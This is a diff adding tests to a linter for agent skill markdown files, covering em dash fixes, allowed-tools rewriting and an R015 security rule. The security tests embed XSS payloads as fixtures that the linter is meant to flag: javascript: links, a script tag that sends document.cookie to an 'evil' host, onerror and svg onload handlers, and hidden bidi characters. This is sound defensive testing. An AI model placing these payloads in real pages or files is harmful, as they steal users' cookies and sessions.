@@ -312,6 +312,114 @@ describe("em dash auto-fix (R009)", () => {
     const twice = applyFixes(once).fixed;
     expect(twice).toBe(once);
   });
+
+  // The fix masks code to spaces (length-preserving) to FIND em dashes, then
+  // walked that same mask to collapse surrounding whitespace — so an inline
+  // code span next to an em dash read as whitespace and got sliced away.
+  // Measured on the real corpus: 723 spans destroyed across 178 skills.
+  test("inline code before an em dash survives", () => {
+    const md = "---\nname: x\ndescription: Use when X.\n---\n\n# X\n\n- `get_latest_news` — Fetch recent news\n";
+    const { fixed } = applyFixes(md);
+    expect(fixed).toContain("`get_latest_news`");
+    expect(fixed).toContain("- `get_latest_news`, Fetch recent news");
+  });
+
+  test("inline code after an em dash survives", () => {
+    const md = "---\nname: x\ndescription: Use when X.\n---\n\n# X\n\nRun it — `bun test` proves it.\n";
+    const { fixed } = applyFixes(md);
+    expect(fixed).toContain("`bun test`");
+    expect(fixed).toContain("Run it, `bun test` proves it.");
+  });
+
+  test("code spans on both sides of an em dash both survive", () => {
+    const md = "---\nname: x\ndescription: Use when X.\n---\n\n# X\n\n`a` — `b`\n";
+    const { fixed } = applyFixes(md);
+    expect(fixed).toContain("`a`, `b`");
+  });
+});
+
+describe("allowed-tools auto-fix (R005)", () => {
+  const fm = (tools: string) =>
+    `---\nname: x\ndescription: Use when X.\n${tools}\n---\n\n# X\n\nBody.\n`;
+
+  test("a block sequence is rewritten whole, not orphaned under a scalar", () => {
+    const md = fm("allowed-tools:\n  - ffmpeg\n  - imagemagick");
+    const { fixed, applied } = applyFixes(md);
+    expect(applied).toContain("R005");
+    expect(fixed).toContain("allowed-tools: Bash(ffmpeg:*), Bash(imagemagick:*)");
+    // The old fix replaced only the key line, leaving `  - ffmpeg` beneath a
+    // scalar; YAML then folded the leftovers into one garbage string.
+    expect(fixed).not.toMatch(/allowed-tools:.*\n\s+-\s/);
+    expect(fixed).not.toContain("Bash(-:*)");
+  });
+
+  test("a pure-MCP block sequence is left alone", () => {
+    const md = fm("allowed-tools:\n  - mcp__trendradar__get_latest_news\n  - mcp__trendradar__search_news");
+    const { fixed, applied } = applyFixes(md);
+    expect(applied).not.toContain("R005");
+    expect(fixed).toBe(md);
+  });
+
+  test("top-level tools stay bare, bare CLI names get wrapped", () => {
+    const md = fm("allowed-tools:\n  - Read\n  - Grep\n  - ffmpeg");
+    const { fixed } = applyFixes(md);
+    expect(fixed).toContain("allowed-tools: Read, Grep, Bash(ffmpeg:*)");
+  });
+
+  test("bare `Bash` is a tool name, not a CLI name", () => {
+    // Wrapping it produced the nonsense `Bash(Bash:*)`.
+    const md = fm("allowed-tools: Bash");
+    const { fixed, applied } = applyFixes(md);
+    expect(applied).not.toContain("R005");
+    expect(fixed).not.toContain("Bash(Bash:*)");
+    expect(fixed).toBe(md);
+  });
+
+  test("a block of top-level tools including Bash is left alone", () => {
+    const md = fm("allowed-tools:\n  - Read\n  - Write\n  - Edit\n  - Bash");
+    const { fixed, applied } = applyFixes(md);
+    expect(applied).not.toContain("R005");
+    expect(fixed).toBe(md);
+  });
+
+  test("already-wrapped entries are preserved as written", () => {
+    const md = fm("allowed-tools:\n  - Bash(git:*)\n  - ffmpeg");
+    const { fixed } = applyFixes(md);
+    expect(fixed).toContain("allowed-tools: Bash(git:*), Bash(ffmpeg:*)");
+  });
+
+  test("inline comma-separated bare names still get wrapped", () => {
+    const md = fm("allowed-tools: ffmpeg, imagemagick");
+    const { fixed } = applyFixes(md);
+    expect(fixed).toContain("allowed-tools: Bash(ffmpeg:*), Bash(imagemagick:*)");
+  });
+
+  test("space-separated bare names split too", () => {
+    // Splitting on commas alone produced the single bogus `Bash(nmap curl:*)`.
+    const md = fm("allowed-tools: nmap curl");
+    const { fixed } = applyFixes(md);
+    expect(fixed).toContain("allowed-tools: Bash(nmap:*), Bash(curl:*)");
+  });
+
+  test("a wrapper containing a space is one tool, not two", () => {
+    // The reason the split cannot be a plain /[,\s]+/.
+    const md = fm("allowed-tools: Bash(git diff:*), ffmpeg");
+    const { fixed } = applyFixes(md);
+    expect(fixed).toContain("allowed-tools: Bash(git diff:*), Bash(ffmpeg:*)");
+  });
+
+  test("flow sequence brackets are stripped", () => {
+    const md = fm("allowed-tools: [ffmpeg, Read]");
+    const { fixed } = applyFixes(md);
+    expect(fixed).toContain("allowed-tools: Bash(ffmpeg:*), Read");
+  });
+
+  test("R005 fixes are idempotent", () => {
+    const md = fm("allowed-tools:\n  - ffmpeg\n  - mcp__x__y\n  - Read");
+    const once = applyFixes(md).fixed;
+    const twice = applyFixes(once).fixed;
+    expect(twice).toBe(once);
+  });
 });
 
 describe("score", () => {
@@ -542,5 +650,66 @@ describe("R006 with cli-recipes", () => {
     const md = `---\nname: x\ndescription: Use when X.\nallowed-tools: Bash(helm:*)\n---\n\n# X\n\nBody.\n`;
     const { fixed } = applyFixes(md);
     expect(fixed).toContain("sudo snap install helm");
+  });
+});
+
+describe("R015 security", () => {
+  const fm = `---\nname: x\ndescription: Use when the user asks to do X.\n---\n\n# X\n\n`;
+
+  test("dangerous URL scheme in a prose link is flagged as error", () => {
+    const md = fm + `See [click me](javascript:steal(document.cookie)) for details.\n`;
+    const r = lint(md).diagnostics.find((d) => d.rule === "R015");
+    expect(r?.severity).toBe("error");
+  });
+
+  test("the same dangerous link inside a code fence is NOT flagged (documentation)", () => {
+    const md = fm + "Example of what NOT to do:\n\n```md\n[click me](javascript:steal())\n```\n";
+    expect(lint(md).diagnostics.find((d) => d.rule === "R015")).toBeUndefined();
+  });
+
+  test("raw <script> in prose is flagged; inside a fence it is not", () => {
+    const live = fm + `Inject <script>fetch("//evil?"+document.cookie)</script> here.\n`;
+    expect(lint(live).diagnostics.find((d) => d.rule === "R015")?.severity).toBe("error");
+    const doc = fm + "```html\n<script>example()</script>\n```\n";
+    expect(lint(doc).diagnostics.find((d) => d.rule === "R015")).toBeUndefined();
+  });
+
+  test("invisible/bidi character anywhere is flagged AND auto-fixable", () => {
+    const md = fm + "A line with a word\u2060joiner hidden in it.\n";
+    const diag = lint(md).diagnostics.find((d) => d.rule === "R015");
+    expect(diag?.severity).toBe("error");
+    expect(diag?.fix).toBeDefined();
+    const { fixed } = applyFixes(md);
+    expect(/[\u200b-\u200f\u202a-\u202e\u2060-\u2064\u2066-\u2069\ufeff\u00ad]/.test(fixed)).toBe(false);
+    expect(fixed).toContain("wordjoiner");
+  });
+
+  test("a clean skill produces no R015 diagnostics", () => {
+    const md = fm + "Use https://example.com and a normal [link](https://example.com).\n";
+    expect(lint(md).diagnostics.find((d) => d.rule === "R015")).toBeUndefined();
+  });
+
+  test("lint-ignore R015 suppresses the finding (escape hatch for security-doc skills)", () => {
+    const md = `---\nname: x\ndescription: Use when X.\nlint-ignore: R015\n---\n\n# X\n\nRaw <iframe src=evil></iframe> shown deliberately.\n`;
+    expect(lint(md).diagnostics.find((d) => d.rule === "R015")).toBeUndefined();
+  });
+
+  test("prose with an on-prefixed word assigned a value does NOT false-positive", () => {
+    for (const line of ["The job runs once = 'daily'.", "Set online = 'false' to disable.", "The only = 'admin' rule applies."]) {
+      const md = fm + line + "\n";
+      expect(lint(md).diagnostics.find((d) => d.rule === "R015")).toBeUndefined();
+    }
+  });
+
+  test("unquoted inline event handler inside a tag IS flagged", () => {
+    const md = fm + `An <img onerror=steal(document.cookie)> tag.\n`;
+    expect(lint(md).diagnostics.find((d) => d.rule === "R015")?.severity).toBe("error");
+  });
+
+  test("raw <form> and a data:image/svg link are flagged", () => {
+    const form = fm + `A <form action="javascript:bad()"> here.\n`;
+    expect(lint(form).diagnostics.find((d) => d.rule === "R015")?.severity).toBe("error");
+    const svg = fm + `An image ![x](data:image/svg+xml,<svg onload=alert(1)>) here.\n`;
+    expect(lint(svg).diagnostics.find((d) => d.rule === "R015")?.severity).toBe("error");
   });
 });
